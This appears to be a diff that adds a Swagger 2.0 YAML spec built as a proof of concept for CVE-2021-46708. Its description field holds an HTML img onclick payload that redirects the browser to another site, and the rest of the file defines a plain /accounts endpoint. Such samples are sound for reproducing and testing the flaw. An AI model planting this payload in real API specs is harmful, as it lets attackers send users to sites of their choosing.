@@ -1,0 +1,14 @@
+swagger: '2.0'
+info:
+  title:  CVE-2021-46708 onliclick action redirect any site
+  description: <img src=x onclick='document.location.href ="http://google.com";'>
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
